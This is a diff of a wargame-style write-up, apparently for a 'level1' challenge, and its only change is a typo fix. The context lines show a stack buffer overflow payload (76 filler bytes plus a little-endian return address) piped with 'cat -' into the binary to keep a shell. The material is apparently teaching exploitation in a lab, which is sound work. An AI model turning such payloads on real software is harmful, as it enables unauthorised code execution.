@@ -30,7 +30,7 @@ First we will need to write the address of `run` in little endian `44840408` and
 print "A"*76 + "\x44\x84\x04\x08"
 ```
 But we will need to have the prompt back to be able to pass command to the shell. For that we will use `cat -`.
-Those two combined this will give use
+Those two combined this will give us
 ```shell
 (cat <(python -c 'print "A" * 76 + "\x44\x84\x04\x08"') -) | ./level1
 ```
